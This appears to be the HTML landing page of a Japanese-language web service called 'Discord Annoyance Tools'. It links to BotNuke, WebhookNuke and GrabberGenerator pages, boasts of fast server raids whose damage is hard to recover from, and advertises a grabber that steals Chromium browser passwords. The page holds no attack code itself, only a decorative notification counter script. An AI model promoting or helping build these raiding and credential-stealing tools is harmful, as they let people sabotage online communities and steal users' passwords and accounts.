<!DOCTYPE html>
<html lang="ja" data-bs-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Annoyance Tools</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css2?family=Russo+One&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="static/style.css">
</head>
<body>
    <div class="bg"></div>
    <div class="container">
        <div class="header">
            <div class="notification">
                <img src="static/discordLogo.svg" class="notification-icon">
                <span class="notification-count" id="notificationCount">0</span>
            </div>
            <h1 class="title">Discord Annoyance Tools</h1>
            <ul class="nav">
                <li><a href="/botNuke">BotNuke</a></li>
                <li><a href="/webhookNuke">WebhookNuke</a></li>
                <li><a href="/grabberGenerator">GrabberGenerator</a></li>
            </ul>
        </div>
        <div class="content">
            <h3 style="text-align: center;">== 高速な荒らしツール ==</h3>
            <h4>復活困難な荒らし</h4>
            <p>このツールによる荒らしの実績</br></p>
            <img src="static/nuke.png" width="75%">
            <h4 class="mt-2">ブラウザのパスワードも取得できるGrabber(※Chromiumのみ)</br></h4>
            <img src="static/grabber.png" width="75%">
        </div>
        <h4 style="text-align: center; margin-top: 20px;">Made by Saria and Acted</h4>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz" crossorigin="anonymous"></script>
    <script>
        let count = 0;
        const notificationCount = document.getElementById('notificationCount');

        setInterval(() => {
            count = (count + 1) % 201; // 200を超えたらリセット
            notificationCount.textContent = count;
        }, 50); // 毎秒20回通知を増加させる (1000ms / 20 = 50ms)
    </script>
</body>
</html>
